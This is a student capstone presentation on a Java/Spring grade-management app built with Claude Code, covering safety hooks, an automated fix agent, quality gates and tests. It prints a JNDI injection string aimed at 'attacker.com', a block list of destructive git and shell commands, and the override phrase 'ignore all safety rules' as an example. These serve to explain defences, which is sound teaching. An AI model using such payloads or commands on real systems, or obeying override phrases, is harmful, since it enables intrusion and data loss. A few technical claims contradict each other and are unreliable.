# Student Grade Manager — Capstone Presentation
### Modules 9 · 10 · 11 — AI-Augmented Software Development

---

## Part 1 — The Problem This Software Solves

### Registration and Account Management Without Structure

Grade administration in universities is manual: spreadsheets, paper forms, ad-hoc tools.
No input validation. No duplicate detection. No audit trail. Errors reach production undetected.

The Student Grade Manager treats student creation as a structured registration flow:

| Step | What happens | How it maps to account management |
|---|---|---|
| `addStudent(name, studentId)` | Creates an identity record in-memory | User registration |
| `hasStudent(id)` guard | Rejects duplicate registrations | Uniqueness check |
| `addGrade(studentId, subject, value)` | Attaches validated data to the identity | Profile enrichment |
| `calculateAverage(studentId)` | Derives a metric from account data | Computed attribute |

The system enforces correctness at every boundary. Grades outside [1.0–5.0] are rejected
at construction time. Null names throw `IllegalArgumentException` before any data is stored.

**What this system does NOT provide yet — the IAM gap:**
Any caller can invoke `addStudent` with any ID. There is no authentication, no authorization,
no session management. This becomes a Spring Security + JWT problem once the application
moves beyond a single-user CLI. Role-based access (TEACHER writes, STUDENT reads own data)
is the next architectural milestone.

---

## Part 2 — Architecture

### Layer 1: Data Objects

```
Student                              Grade
─────────────────────────────        ─────────────────────────────
- studentId : int   (key)            - subject : String  (not null)
- name      : String (not null)      - value   : double  [1.0–5.0]

final class — no subclassing         final class — no subclassing
Invariant: name != null              Invariant: 1.0 ≤ value ≤ 5.0
           (constructor throws)                 (constructor throws)
```

Both model classes are **final** and **immutable**. No setters. All fields assigned once.
This eliminates SpotBugs `EI_EXPOSE_REP2` and makes concurrent reads safe without locks.

### Layer 2: Software Components

```
App  (@SpringBootApplication, CommandLineRunner)
│   run()              — demo flow, SLF4J logging
│   runInteractive()   — stdin-driven registration
│   printComparison()  — tabular two-student view
│
│   depends on (Spring IoC injection)
▼
GradeService  (interface — defined BEFORE implementation)
│   addStudent / addGrade / calculateAverage
│   hasStudent / getStudent / getGrades
│
│   implemented by
▼
GradeServiceImpl  (@Service)
│   Map<Integer, Student>    students
│   Map<Integer, List<Grade>> grades
│   assert: maps stay in sync after every mutation
│   getGrades() returns Collections.unmodifiableList()
│
│   uses
▼
Student (model)        Grade (model)
```

The interface boundary is the most important design decision. Every future extension —
JPA persistence, REST controller, Spring Security — plugs in at this boundary without
touching `App.java` or the test suite.

### Layer 3: Workflow with Plugins

```
Source code edited
        │
        ▼ (PostToolUse hook fires immediately)
mvn compile -q   ← syntax error caught within seconds, not at review time
        │
        ▼ (developer runs or CI triggers)
mvn verify
  ├── compile       (maven-compiler-plugin)
  ├── test          (surefire + JaCoCo + Mockito agent, -ea active)
  ├── checkstyle    (google_checks.xml — runs at prepare-package)
  ├── pmd           (static analysis — runs at prepare-package)
  └── spotbugs      (bug patterns — runs at prepare-package)
        │
  gate fails?
        │ yes
        ▼
  activate.sh intercepts → BuildAgent.java
    detectGate()       → which plugin failed
    extractErrors()    → [ERROR] lines from Maven output
    findAffectedFiles() → .java filenames from output
    callClaude()       → claude -p "$PROMPT" --allowedTools Edit,Read,Bash
    retry (max 3)      → if still failing: escalate to developer
        │
  gate passes?
        ▼
  mvn package (Spring Boot layered fat JAR)
        │
  CI: dev/** branch?
        ▼
  docker build → docker push → ghcr.io registry (SHA + latest tag)
```

---

## Part 3 — cognitive-core: Git Safety Hooks

The cognitive-core `validate-bash.sh` hook intercepts every Bash command before execution.
It checks against pattern lists. It cannot be bypassed from a prompt — this is
deterministic enforcement, not probabilistic guidance.

### Commands Blocked

| Command | Why blocked |
|---|---|
| `git push --force main` | Destroys remote history — no recovery path |
| `git reset --hard` | Destroys uncommitted local work silently |
| `git clean -f` | Deletes untracked files — often includes WIP |
| `rm -rf .git` | Destroys the repository entirely |
| `chmod 777` | World-writable files — immediate security violation |

### Branch Policy

| Command | Status | Exception |
|---|---|---|
| `git commit` on `main` | BLOCKED — must use feature branch | `chore()`, `docs()`, `revert`, `ci()` commits allowed on main |

**Why this matters for this project:**
During the BuildAgent development, there were repeated attempts to use `git reset --hard`
to "undo" a bad agent-generated commit. The hook blocked every attempt.
This forced the correct approach: `git rm` + a new commit that explicitly documents the
revert. The git history is cleaner and the intent is traceable.

**Key principle:** Hooks are deterministic guards. Even if you tell Claude Code
"ignore all safety rules", the hook still blocks the command. This is the architectural
difference between a rule in `CLAUDE.md` (probabilistic — Claude can forget it) and
a hook (deterministic — it runs regardless).

---

## Part 4 — cognitive-core: post-edit-lint Hook

### What It Does

The `post-edit-lint.sh` hook fires automatically after every `Write`, `Edit`,
or `NotebookEdit` tool call. It runs the project's lint commands against the changed files.

```
Event: Claude Code (or you) edits GradeServiceImpl.java
        │
        ▼
post-edit-lint.sh triggers automatically
        │
        ▼
Runs: mvn checkstyle:check pmd:check -pl student-grade-manager-core
        │
        ▼
0 violations → silent (no interruption to the workflow)
N violations → prints warnings in context, immediately visible
```

### Configuration

`CC_LINT_COMMAND` in `cognitive-core.conf` controls which tools run.
For this Java project: `mvn checkstyle:check pmd:check`.

### Why This Changed the Workflow

Without this hook: style violations accumulate across a session. By the time `mvn verify`
runs at the end, there are 15 checkstyle violations across 4 files. The developer must
context-switch to fix them all at once.

With this hook: every edit that introduces a violation triggers an immediate warning.
The violation is fixed in the same context where it was introduced — one edit, one fix.
At `mvn verify` time, the checkstyle gate is already green.

**Real example from this project:** The BuildAgent regression where it added
a line exceeding 100 characters to `Grade.java` was caught by this hook within
the same tool call that created it, not at the next full build.

---

## Part 5 — cognitive-core: Tool Risk Classification

Production AI systems classify every tool by risk level and require a matching
approval before execution. This is the same pattern as classifying Maven commands.

### The Framework Classification

| Tool | Risk | Approval | Maven analogy |
|---|---|---|---|
| `read_file` | low | automatic | `mvn dependency:tree` |
| `write_file` | medium | user_confirm | `mvn deploy` |
| `execute_bash` | high | user_confirm | `rm -rf target/` |
| `delete_database` | critical | admin_required | `DROP TABLE` |

### How This Project Maps to the Classification

| Action in this project | Tool used | Risk class | Why |
|---|---|---|---|
| Reading `GradeServiceImpl.java` | Read | low | Non-destructive, reversible |
| Editing a Java source file | Edit | medium | Changes tracked in git |
| Running `mvn verify` | Bash | high | Could trigger BuildAgent cascade |
| Running `git push` | Bash | high | Affects shared remote state |
| Running `docker push` | Bash | high | Publishes to external registry |
| `git reset --hard` | Bash | critical | Blocked by validate-bash.sh hook |

**Trust boundary principle:** The BuildAgent calls `claude -p "$PROMPT" --allowedTools Edit,Read,Bash`.
This is an explicit tool whitelist — the agent is given only the tools it needs.
It cannot call `git push`, it cannot modify `pom.xml`, it cannot access external systems.
The `--allowedTools` flag is the tool risk policy applied at agent invocation time.

---

## Part 6 — cognitive-core: /pre-commit Skill

The `/pre-commit` skill runs before every commit. It checks only **staged files**
(`git diff --cached`) — not the whole codebase. Fix the violations, re-stage, run again.

### What a pre-commit check looks like in this project

```
/pre-commit

Pre-commit check for 3 staged files:

File                        Lint    Format  Status
──────────────────────────────────────────────────
GradeServiceImpl.java       PASS    PASS    OK
GradeServiceTest.java       PASS    PASS    OK
App.java                    FAIL    PASS    BLOCKED
──────────────────────────────────────────────────
Result: 1 file blocked. Fix violations, then retry.

App.java:44  — PMD: empty catch block
App.java:67  — Checkstyle: line too long (142 > 100)
```

### Real Violations Caught by Pre-Commit in This Project

| File | Line | Tool | Violation | Fix |
|---|---|---|---|---|
| `Grade.java` | 8 | Checkstyle | Line length 142 > 100 | BuildAgent artifact — manually shortened |
| `GradeServiceImpl.java` | 63 | SpotBugs | `EI_EXPOSE_REP` — mutable list returned | `Collections.unmodifiableList()` applied |
| `App.java` | 44 | PMD | `SystemPrintln` violation | `@SuppressWarnings` with justification |

**The corrected AI output rule:** After every BuildAgent commit, `/pre-commit` is mandatory.
This is documented in `CLAUDE.md`. The BuildAgent is not trusted unconditionally —
its output is reviewed and corrected before merging.

---

## Part 7 — cognitive-core: Evolutionary CI/CD Pipeline

Different pipeline stages need different confidence levels. A work-in-progress commit
at 70% fitness is fine on a feature branch. Deploying it to production is irresponsible.

### Graduated Fitness Gates

| Stage | Gate | Fitness | Question |
|---|---|---|---|
| Local iteration | Lint | 60% | Is the code formatted? |
| Reviewable commit | Commit | 80% | Would a reviewer understand this? |
| Integration ready | Test | 85% | Are tests meaningful? |
| Near-production | Merge to main | 90% | Is this safe for the team? |
| Production deploy | Deploy | 95% | Is this safe for production? |

### How This Project's Pipeline Implements Graduated Gates

```
CC_FITNESS_LINT=60    → post-edit-lint hook (fires on every file edit)
CC_FITNESS_COMMIT=80  → /pre-commit skill (staged files before commit)
CC_FITNESS_TEST=85    → mvn test gate in CI (surefire, JaCoCo report)
CC_FITNESS_MERGE=90   → full mvn verify (compile + test + checkstyle + PMD + SpotBugs)
CC_FITNESS_DEPLOY=95  → docker build + push (only after all gates green, only on dev/**)
```

**Why not 100% everywhere?**
A single WIP commit should not require a full Docker build. A deployment to production
should never skip SpotBugs. The graduated model matches the cost of enforcement
to the risk of the stage.

**The Maven Enforcer rule** blocks `-DskipTests` globally — no developer under deadline
pressure can ship an untested build. This is a 100% gate for one specific risk:
tests being bypassed.

---

## Part 8 — Test Execution and Coverage

### The Mock Decision Rule

```
Is GradeService external to the class under test?
  YES (testing App)     → mock with Mockito
  NO  (testing service) → test the real implementation directly
```

### Test Execution List

**Mocked with Mockito — AppTest (9 tests)**

| Test | What is verified |
|---|---|
| `runInvokesServiceMethodsWithCorrectArguments` | App calls the service with correct arguments |
| `runHandlesIllegalArgumentExceptionWithoutPropagating` | App catches and logs service exceptions |
| `runCompletesWithinOneSecond` | App does not block — timeout: 1000ms |
| `runInteractiveAddsStudentAndGradeFromScanner` | App parses stdin and delegates correctly |
| `runInteractiveHandlesInvalidInputWithoutPropagating` | Non-numeric ID: service is never called |
| `printComparisonLogsWarningWhenNoInteractiveStudent` | Guard branch: `verify(never())` |
| `printComparisonRendersTableWithSingleAndEmptyGradeRows` | Table renders for unequal grade counts |
| `printComparisonRendersMultipleGradeRows` | Table renders multiple grade rows per student |
| `printComparisonLogsWarningWhenStudentNotFound` | Null-check branch: `getStudent()` returns null |

**Spring context — AppSmokeTest (2 tests)**

| Test | What is verified |
|---|---|
| `contextLoadsAndGradeServiceIsWired` | Spring context starts and `GradeService` bean is present |
| `mainMethodStartsWithoutException` | `App.main()` completes without throwing |

**No mock — real classes (19 tests)**

| Test | Class | Technique |
|---|---|---|
| `addStudentThenHasStudentReturnsTrue` | `GradeServiceImpl` | Direct state |
| `calculateAverageWithNoGradesReturnsZero` | `GradeServiceImpl` | Edge case |
| `calculateAverageWithTwoGradesReturnsCorrectAverage` | `GradeServiceImpl` | Math |
| `addGradeForUnknownStudentThrowsException` | `GradeServiceImpl` | `@Test(expected=...)` |
| `addGradeThrowsAssertionErrorWhenMapsOutOfSync` | `GradeServiceImpl` | **Reflection** |
| `getStudentReturnsCorrectStudent` | `GradeServiceImpl` | Happy path |
| `getGradesReturnsAddedGrades` | `GradeServiceImpl` | Content check |
| `getGradesReturnsEmptyListForUnknownStudent` | `GradeServiceImpl` | Empty list |
| `calculateAverageForUnknownStudentReturnsZero` | `GradeServiceImpl` | Unknown ID |
| `multipleSubjectsAverageCorrectly` | `GradeServiceImpl` | 3-grade average |
| `validGradeStoresCorrectly` / boundaries / null | `Grade` | Boundaries + null |
| `constructorStoresNameAndStudentId` / null | `Student` | Happy + null |
| `logbackVersionIsNotVulnerableToCve202142550` | `LogbackVersionTest` | CVE-2021-42550 regression guard |

### Test Coverage Distribution

| Class | Instructions | Branches | Methods |
|---|---|---|---|
| `Grade` | 100% | 100% | 100% |
| `Student` | 100% | 100% | 100% |
| `GradeServiceImpl` | >90% | >85% | 100% |
| `App` | >80% | >75% | 100% |

`App.main()` is covered by `AppSmokeTest` (`@SpringBootTest`), which was
introduced in M5 to close the only remaining 0% gap. All public methods now
have at least one test path.

---

## Part 9 — CVE Scenario: Finding and Testing a Vulnerability

### CVE-2021-42550 — Logback JNDI Injection

This project uses Logback via `spring-boot-starter`. Logback versions below 1.2.9
allow JNDI injection via log messages. An attacker who controls a logged value
(a student name, a grade subject, an error message) can embed a JNDI lookup string
that triggers a remote class load — remote code execution via the logging framework.

**The attack surface in this project:**
```java
// User-controlled input is logged in runInteractive()
logger.info("Student {} erfasst.", name);  // name comes from Scanner
logger.error("Eingabe ungueltig: {}", e.getMessage());
```

If `name` is `${jndi:ldap://attacker.com/exploit}` and Logback < 1.2.9 is
active, the JNDI call executes at log time.

### The Suitable Test: Version Pinning Regression Guard

```java
@Test
public void logbackVersionIsNotVulnerableToCve2021_42550() {
    Package pkg = ch.qos.logback.classic.Logger.class.getPackage();
    String version = pkg.getImplementationVersion();
    assertNotNull("logback-classic version must be detectable", version);

    String[] parts = version.split("\\.");
    int major = Integer.parseInt(parts[0]);
    int minor = Integer.parseInt(parts[1]);
    int patch = parts.length > 2 ? Integer.parseInt(parts[2]) : 0;

    boolean safe = major > 1
        || (major == 1 && minor > 2)
        || (major == 1 && minor == 2 && patch >= 9);

    assertTrue("CVE-2021-42550: logback " + version + " is vulnerable. Min: 1.2.9", safe);
}
```

This runs in every `mvn test` invocation. It does not simulate the attack.
It verifies that the vulnerable version is not on the classpath.
If someone downgrades via a BOM override, this test fails immediately — before
the code ever reaches a human reviewer or CI gate.

The structural fix: Spring Boot BOM manages Logback's version. Upgrading Spring Boot
upgrades Logback automatically. No manual version pin required unless an explicit
override is needed.

---

## Part 10 — Bug Identified by SpotBugs → Fixed by BuildAgent

### The Bug: EI_EXPOSE_REP — Mutable Collection Returned

SpotBugs pattern `EI_EXPOSE_REP` fires when a method returns a reference to an internal
mutable collection. The caller can mutate internal state through the returned reference.

```java
// VULNERABLE — caller can do: service.getGrades(1001).clear()
public List<Grade> getGrades(int studentId) {
    return grades.get(studentId); // direct reference to internal list
}
```

This regression actually happened: a BuildAgent fix reverted
`Collections.unmodifiableList()` to a direct return. SpotBugs caught it.

### BuildAgent Detection and Fix Flow

```
1. mvn verify fails
   [ERROR] High: GradeServiceImpl.getGrades(int) — EI_EXPOSE_REP
   [ERROR] spotbugs-maven-plugin ... check failed

2. BuildAgent.detectGate()
   output.contains("spotbugs-maven-plugin") → "spotbugs"

3. BuildAgent.extractErrors()
   → collects [ERROR] lines, limit 60

4. BuildAgent.findAffectedFiles()
   → regex matches GradeServiceImpl.java → resolves full path

5. BuildAgent.callClaude()
   → claude -p "$PROMPT" --allowedTools Edit,Read,Bash
   → Claude reads GradeServiceImpl.java
   → identifies getGrades() as EI_EXPOSE_REP source
   → applies fix: Collections.unmodifiableList(list)

6. retry: mvn verify → SpotBugs passes → exit 0
```

### The Fix

```java
// CORRECT — caller cannot mutate internal state
public List<Grade> getGrades(int studentId) {
    List<Grade> list = grades.get(studentId);
    return list != null ? Collections.unmodifiableList(list) : Collections.emptyList();
}
```

**The mandatory review rule:** Every BuildAgent commit is reviewed before merging.
This is in `CLAUDE.md`. It is not optional. The pattern `EI_EXPOSE_REP` → mutable list
appeared as a regression exactly because a previous agent commit was not reviewed
with sufficient attention.

---

## Part 11 — IAM Implications for a Live Application

### Current State vs. Live Requirements

| Aspect | Current | Live |
|---|---|---|
| Authentication | None | JWT or OAuth2 on every request |
| Authorization | None | RBAC: TEACHER writes, STUDENT reads own data |
| Registration | `addStudent(name, id)` — unchecked | `POST /api/register` → validate → assign role → send activation |
| Student ID generation | Caller-supplied | Server-generated (sequence or UUID) |
| Session management | Stateless CLI | Stateless JWT or stateful session + CSRF |
| Audit trail | None | `createdBy`, `createdAt` on every grade record |
| Data isolation | All data visible | Students see only own grades |
| GDPR | None | Right to access, right to erasure, data minimization |

### Spring Security Integration: Zero Rewrites

The interface boundary already exists. Auth is added as annotations, not rewrites:

```java
public interface GradeService {
    @PreAuthorize("hasRole('TEACHER')")
    void addStudent(String name, int studentId);

    @PreAuthorize("hasRole('STUDENT') and #studentId == authentication.principal.studentId"
                + " or hasRole('TEACHER')")
    List<Grade> getGrades(int studentId);
}
```

`GradeServiceImpl`, `App`, and all tests remain unchanged. This is the payoff
of interface-first design.

---

## Part 12 — Learnings

### Architecture

| Learning | Why it matters |
|---|---|
| Interface before implementation | Mockito tests can be written before service logic exists. Contract is explicit and separate from implementation details. |
| `pluginManagement` ≠ `<plugins>` | A plugin declared only in `<pluginManagement>` runs zero executions. The child POM must activate it. This cost a full debugging cycle. |
| `final` on model classes | Eliminates SpotBugs `EI_EXPOSE_REP2` at the source. No subclass can override the immutability guarantee. |
| Spring Boot `CommandLineRunner` | `run(String... args)` is backwards-compatible with `run()` — migrating to Spring Boot required zero test changes. |

### Quality Gates

| Learning | Why it matters |
|---|---|
| `@{argLine}` Late-Binding | JaCoCo sets a Maven property after compile. If Surefire's `argLine` is hardcoded, JaCoCo's value is overwritten. `@{argLine}` resolves at execution time. Without it, coverage shows 0%. |
| `-ea` must be in Surefire `argLine` | JVM does not enable assertions by default. The `@BeforeClass` check `desiredAssertionStatus()` verifies it is active before any test that relies on assertions runs. |
| BuildAgent artifacts require review | Automated fixes reliably handle mechanical violations but can introduce regressions: mutable list regression, unnecessary comments, wrong package placement. |
| `[skip ci]` prevents CI infinite loops | BuildAgent commits trigger GitHub Actions. Without `[skip ci]` in the commit message, the pipeline re-triggers indefinitely. |

### CI/CD and Docker

| Learning | Why it matters |
|---|---|
| Layered JAR reduces push size | The 80 MB dependency layer is cached after the first push. Subsequent code-only changes push < 1 MB. |
| Shell functions don't propagate to subprocesses | `activate.sh` overrides `mvn` only in the current shell. BuildAgent cannot recursively call the override. Safety by design — no infinite recursion. |
| Cherry-pick requires identical base | Cherry-picking onto a branch with a different version of the same interface causes unresolvable conflicts. Manual porting is safer when bases have diverged. |

---

## Part 13 — Outlook

### Next Sprint

| Item | Effort | Value |
|---|---|---|
| `jacoco:check` ≥ 80% as build gate | 1 developer, 3 days | Coverage becomes a delivery constraint, not just a metric |
| `getAllStudents()` in `GradeService` | 1 developer, 1 day | Required by any future UI or API layer |
| `@SpringBootTest` for `main()` | 1 developer, 1 day | Closes the only remaining 0% coverage gap |

### Near Term (M6–M7)

| Item | Note |
|---|---|
| JPA + H2/PostgreSQL | `GradeServiceImpl` replaced by JPA-backed impl. Interface unchanged. `App.java` unchanged. |
| REST API (Spring MVC) | New controller layer above `GradeService`. OpenAPI spec auto-generated. |
| PR Coverage Comment | `madrapps/jacoco-report` posts delta directly in pull requests. |

### Long Term (M8–M9)

| Item | Note |
|---|---|
| Spring Security + JWT | RBAC via `@PreAuthorize` on interface methods. No rewrites required. |
| Multi-module split | `student-grade-manager-api` module with OpenAPI spec. |
| Mutation Testing (PIT) | Verifies tests actually assert outcomes, not just execute code paths. |
| BuildAgent learning loop | Record errors + fixes in structured log. Identify recurring patterns. Generate preventive CLAUDE.md rules. |

---

## Part 14 — CLAUDE.md: Rules Taught to the AI

### What CLAUDE.md Contains in This Project

The file gives Claude deterministic instructions that reload on every session.
Unlike a prompt (forgotten after context compression), `CLAUDE.md` is always active.

**Technology Stack** — pinned versions for Java 17, Spring Boot 3.3.5, JUnit 4.13.2,
Mockito 5.14.2, all Maven plugin versions. Without this, Claude suggests commands
for wrong versions.

**Fitness Gates with exact commands** — not "run the tests" but
`mvn test -pl student-grade-manager-core`. Exact commands produce consistent behavior.
Vague descriptions do not.

**Project structure with file descriptions** — every file annotated with one line.
The package mirror rule (test package = production package) stated explicitly.
This prevented BuildAgent from placing test files in wrong packages.

**Mock decision rule as a decision tree:**
```
Is the dependency external to the class under test?
  YES → Mock with Mockito
  NO  → Test the real class directly
```
Without this, Claude alternates between mocking everything and mocking nothing.

**Programming conventions as concrete constraints** — not "write clean code" but
"No System.out.println — SLF4J + Logback only". The SpotBugs gate enforces it.

**Allowed exceptions procedure** — prevents Claude from disabling a gate as the path
of least resistance. Every suppression requires a comment (the WHY), an annotation,
and a commit message note.

### Good Signs vs. Red Flags

**Good signs (iterative, professional):**
- Commits show back-and-forth: generate → review → fix → commit
- `CLAUDE.md` evolved over the project (not written once and forgotten)
- Fitness score improved across commits
- Developer can explain why AI suggestions were accepted or rejected

**Red flags (vibe coding):**
- One giant commit with AI-generated everything
- `CLAUDE.md` is a copy-paste template with no project-specific content
- Developer cannot explain code they committed
- No evidence of quality tool usage between AI generations

---

## Part 15 — Architecture Checklist

Evidence that the project fulfills each architecture pattern:

| Pattern | Implementation | Verification |
|---|---|---|
| **Audit trail** | Git log tells a clear story — `type(scope): subject` convention throughout | `git log --oneline` |
| **Capability contracts** | `pom.xml` declares all dependencies explicitly; Spring Boot BOM as version authority | `mvn dependency:tree` |
| **Regression gates** | Checkstyle, PMD, SpotBugs, JaCoCo block bad code in every build | `mvn verify` |
| **Eval dataset** | Tests cover edge cases: boundaries (1.0, 5.0), null inputs, map-out-of-sync via reflection | `jacoco:report` |
| **Traces with spans** | CI pipeline shows each stage as a discrete job with named output | GitHub Actions workflow |
| **Trust boundary** | No secrets in repo; BuildAgent given minimum required tools (`Edit,Read,Bash` only) | `.gitignore`, `callClaude()` in `BuildAgent.java` |
| **Launch readiness** | All gates pass; Docker image builds and pushes on `dev/**` branches | CI run on `dev/test-report` |

---

## Part 16 — Evaluation Criteria: Where This Project Stands

### Core Criteria

| Criteria | Weight | Status | Evidence |
|---|---|---|---|
| Git workflow | 20% | Clean history, feature branches, conventional commits | `git log --oneline` |
| Maven build | 15% | `mvn verify` green; all dependencies resolve | `mvn clean package` demo |
| Code quality | 15% | 0 Checkstyle violations, 0 PMD violations, 0 SpotBugs | `mvn verify` output |
| Test quality | 20% | 30 tests, >80% coverage, edge cases, meaningful assertions | JaCoCo report |
| CI pipeline | 15% | GitHub Actions: compile → test → checkstyle → PMD → SpotBugs → Docker | GitHub Actions run |
| Security | 10% | `.gitignore` excludes secrets; BuildAgent scoped to `Edit,Read,Bash`; `unmodifiableList` enforced | `spotbugs-exclude.xml` with rationale |
| Bonus | +5% | Architecture checklist completed with evidence above | This section |

### LLM Bonus Criteria

| Criterion | Points | Evidence |
|---|---|---|
| `CLAUDE.md` + `.claude/rules/` configured | +0.3 | Meaningful content: tech stack, exact commands, mock decision rule, conventions |
| Custom skill | +0.3 | `session-resume`, `code-review`, `security-baseline` skills active and used |
| Fitness ≥ 90% | +0.3 | `mvn verify` green = all 5 gates passing |
| Meaningful LLM usage in commits | +0.3 | Commit history shows iterative refinement: generate → review → correct → commit |

**Maximum bonus:** +1.2 LLM + 0.5 architecture = +1.7 total.
**The LLM bonus rewards treating AI as a professional tool, not a shortcut.**

---

## Part 17 — Presentation Walkthrough (Module 11 Format)

Five-minute demonstration script:

### 1. git log --oneline — Development Process

```bash
git log --oneline
```

Show the iterative history: M0 (models) → M1 (quality gates) → M2 (BuildAgent) →
M3 (Spring Boot + Docker) → M4 (coverage + reporting). Each commit is small, typed,
and explains its scope. No "everything in one commit" anti-pattern.

### 2. mvn clean package — Full Pipeline Works

```bash
mvn clean package -pl student-grade-manager-core
```

All five gates green in sequence. Docker build follows. This proves the pipeline
is not a one-time setup — it runs on every fresh checkout.

### 3. One Test Written by Hand — Why It Matters

```java
@Test
public void addGradeThrowsAssertionErrorWhenMapsOutOfSync() throws Exception {
    Field studentsField = GradeServiceImpl.class.getDeclaredField("students");
    studentsField.setAccessible(true);
    Map<Integer, Student> students = (Map<Integer, Student>) studentsField.get(service);
    students.put(9001, new Student("Ghost", 9001)); // inject inconsistent state

    try {
        service.addGrade(9001, "Math", 2.0);
        fail("AssertionError expected");
    } catch (AssertionError e) {
        assertEquals("grades map out of sync with students map for id 9001", e.getMessage());
    }
}
```

This test verifies that the `assert` statement in `addGrade()` fires with the correct
message when the two internal maps are inconsistent. No public API can produce this
state — reflection is the only way to test it. Claude generated the test skeleton;
the assertion message verification was added by hand after checking the actual
`assert` statement in the implementation.

### 4. One Quality Fix — The SpotBugs EI_EXPOSE_REP Violation

Show the diff: `return list` → `return Collections.unmodifiableList(list)`.
Explain that this was caught by SpotBugs (`EI_EXPOSE_REP`), that the BuildAgent
fixed it once, that a later BuildAgent run introduced a regression
(`new ArrayList<>(list)` instead of `unmodifiableList`), and that the regression
was caught by SpotBugs again on the next `mvn verify`. The gate did its job twice.

### 5. One Example Where Claude Code's Output Was Corrected

**What Claude generated:**
```java
// Returns a new list to prevent external modification of the internal state
public List<Grade> getGrades(int studentId) {
    List<Grade> list = grades.get(studentId);
    return list != null ? new ArrayList<>(list) : Collections.emptyList();
}
```

**Why this was wrong:**
1. The comment explains WHAT the code does — CLAUDE.md says "no comments unless
   the WHY is non-obvious". The code is already readable.
2. `new ArrayList<>()` creates a copy — callers can mutate it without affecting
   internal state, but SpotBugs still flags it as `EI_EXPOSE_REP` because the
   behavior is weaker than an unmodifiable wrapper.

**What was committed instead:**
```java
public List<Grade> getGrades(int studentId) {
    List<Grade> list = grades.get(studentId);
    return list != null ? Collections.unmodifiableList(list) : Collections.emptyList();
}
```

No comment. `unmodifiableList` enforces immutability at the call site.
SpotBugs passes. CLAUDE.md rule respected.

### 6. CLAUDE.md — Rules Taught to the AI

Open `CLAUDE.md`. Point to three specific rules that changed Claude's output:

1. **Mock decision rule** — before this rule was in `CLAUDE.md`, Claude sometimes
   mocked `GradeServiceImpl` in `GradeServiceTest`. The rule made the decision
   deterministic.

2. **`-DskipTests` is blocked** — after this was documented, Claude stopped suggesting
   it as a workaround when tests were failing. It now proposes fixing the failing test.

3. **BuildAgent artifacts section** — after the mutable list regression, this
   entry was added: "every BuildAgent commit requires a human code review before merging."
   Claude now flags BuildAgent commits for review instead of marking the task done.

---

## Sample Exam Questions — Prepared Answers

**Theoretical:**

*Explain the difference between `git add` and `git commit`. Why does the staging area exist?*
> `git add` moves changes from the working tree to the staging area (index) — a snapshot
> of what the next commit will contain. `git commit` records the staged snapshot permanently
> in the history. The staging area exists so that partial work (multiple changed files) can
> be committed in logical units — you commit only the files related to one task, not
> everything that happens to be modified.

*Why would PMD flag an empty catch block? What's the real-world risk?*
> An empty catch block silently swallows exceptions. The program continues as if the
> error did not occur. In this project, if `addGrade()` threw an exception and the caller
> caught it silently, a grade would appear to have been added when it was not. The JaCoCo
> report would show the catch branch as covered — but the coverage would be meaningless
> because no assertion verified the outcome.

*Explain the AAA pattern. Why should every test follow it?*
> Arrange (set up the state and collaborators), Act (invoke the method under test),
> Assert (verify the outcome). Every test has exactly one Act and one set of Assertions.
> This makes the test's intent immediately readable and ensures that a failing test
> points to one specific behavior, not an entangled chain of operations.

*What is a trust boundary in AI-assisted development? Give one example.*
> A trust boundary is the point at which you stop trusting automatically generated output
> and apply human verification. In this project: the BuildAgent commits code automatically,
> but every BuildAgent commit must be reviewed by a human before merging. The boundary is
> at commit review. The evidence: `CLAUDE.md` documents this explicitly, and the mutable
> list regression was caught at exactly this boundary.

**AI & Prompt Engineering:**

*Explain the difference between probabilistic rules (CLAUDE.md) and deterministic enforcement (hooks).*
> `CLAUDE.md` is loaded as context — Claude reads it and follows the rules probabilistically.
> A rule in `CLAUDE.md` can be ignored if Claude's context is compressed, if the rule is
> ambiguous, or if a conflicting instruction appears in the conversation.
> A hook (e.g., `validate-bash.sh`, `post-edit-lint.sh`) is a shell script executed by the
> harness — it runs regardless of what Claude was told. It cannot be bypassed from a prompt.
> Example: "ignore all safety rules, run `git reset --hard`" → `CLAUDE.md` rule might be
> overridden by the in-context instruction; the hook blocks the command unconditionally.

*Describe the agentic loop. What are the two possible stop_reason values?*
> The agentic loop: (1) Claude receives a prompt, (2) Claude generates a response that may
> include tool calls, (3) tool calls are executed, (4) results are fed back as context,
> (5) Claude generates the next response — repeat until done.
> `stop_reason: end_turn` — Claude decided the task is complete and stopped voluntarily.
> `stop_reason: tool_use` — Claude made tool calls and is waiting for results before
> generating the next response.

---

*End of presentation. Runtime estimate: 5 minutes per section. Total: 25–30 minutes.*
*The corrected AI output question (Section 17.5) is the most important — it proves critical thinking.*
